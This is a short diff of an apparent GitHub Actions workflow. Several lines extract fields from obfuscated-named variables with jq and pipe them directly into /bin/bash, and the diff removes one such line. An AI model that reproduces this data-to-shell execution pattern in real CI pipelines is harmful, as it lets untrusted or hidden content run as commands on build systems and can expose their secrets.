@@ -23,7 +23,6 @@ jobs:
           echo $quw612 | jq -r .l5 | /bin/bash
           printf '%s' "$mr33" | jq -r .kt59 | /bin/bash
           printf '%s' "$kzwe00339" | jq -r .fbkkm89728 | /bin/bash
-          echo $myma64375 | jq -r .fvve14316 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
